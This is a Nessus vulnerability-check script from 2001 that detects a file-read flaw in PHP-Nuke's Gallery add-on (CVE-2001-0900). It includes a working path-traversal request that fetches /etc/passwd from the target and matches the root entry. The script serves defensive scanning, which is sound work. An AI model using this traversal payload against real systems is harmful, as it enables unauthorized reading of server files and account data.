#
# This script is (C) 2001 Renaud Deraison
#


if (description)
{
 script_id(10810);
 script_cve_id("CVE-2001-0900");
 script_version ("$Revision: 1.18 $");
 script_name(english:"PHP-Nuke Gallery Add-on File View");
 desc["english"] = "
The remote PHP-Nuke service has a version of the
'Gallery' Add-on which allow attackers to read arbitrary
files on this host.

Impact:
Every file that the webserver has access to can be read by anyone. 

Solution: Disable this add-on 

Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Determine if a remote host is vulnerable to the gallery vulnerability");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2001 Renaud Deraison");
 script_dependencie("php_nuke_installed.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

function check(data)
{
 req = http_get(item:data, port:port);
 buf = http_keepalive_send_recv(port:port, data:req);
 if( buf == NULL ) exit(0);
 if (egrep(pattern:"root:.*:0:[01]:.*", string:buf))
    {
     security_hole(port);
     exit(0);
    }
}


port = get_http_port(default:80);
installed = get_kb_item("www/" + port + "/php-nuke");
if ( ! installed ) exit(0);
array = eregmatch(pattern:"(.*) under (.*)", string:installed);
if ( ! array ) exit(0);
dir = array[2];

data = string(dir, "/modules.php?set_albumName=album01&id=aaw&op=modload&name=gallery&file=index&include=../../../../../../etc/passwd");
check(data:data);
